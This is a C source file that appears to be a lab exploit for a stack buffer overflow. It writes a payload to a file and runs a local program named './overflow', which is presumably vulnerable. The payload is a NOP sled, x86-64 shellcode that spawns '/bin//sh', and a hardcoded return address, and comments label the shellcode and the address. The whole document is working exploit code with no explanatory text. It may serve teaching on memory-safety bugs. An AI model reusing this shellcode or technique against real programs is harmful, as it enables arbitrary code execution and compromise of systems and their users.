#include<sys/wait.h>
#include<unistd.h>
#include<string.h>
#include<stdio.h>
#include<sys/types.h>

const char *filename = "attacker-controlled-file.txt";

int main(int argc, char * argv[]) 
{
    	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x53\x48\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd0\xea\xff\xff\xff\x7f\x00\x00";
	
    	// return address:  \xd0\xea\xff\xff\xff\x7f\x00\x00
	// shell code: \x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x53\x48\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05

	FILE * fd = fopen(filename, "w");
    	fwrite(payload, 1, sizeof(payload), fd);
    	fclose(fd);

    	pid_t pid = fork();
    	if (pid == 0)
    	{ 	
        	char * argv[] = { "./overflow", NULL };
        	execv(argv[0], argv);
    	}
	    
    	int status;
    	wait(&status);
    	remove(filename);

    	return 0;
}

